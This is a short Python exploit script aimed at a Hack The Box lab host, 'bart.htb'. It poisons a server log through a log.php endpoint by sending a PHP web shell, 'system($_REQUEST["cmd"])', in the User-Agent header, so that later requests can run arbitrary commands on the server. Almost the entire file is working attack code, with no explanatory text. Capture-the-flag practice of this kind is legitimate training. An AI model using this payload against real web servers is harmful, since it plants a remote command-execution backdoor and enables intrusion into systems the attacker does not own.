import requests
import argparse
parser = argparse.ArgumentParser(description="Send a GET request with a custom filename.")
parser.add_argument('-f', '--filename', help='The value for the filename parameter', required=True)
args = parser.parse_args()
base_url = "http://internal-01.bart.htb/log/log.php?"
log_poisoning_url = f"{base_url}filename={args.filename}&username=harvey"
headers = {'User-Agent': '<?php system($_REQUEST["cmd"]); ?>'}
r = requests.get(log_poisoning_url, headers=headers)
print("Response status:", r.status_code)
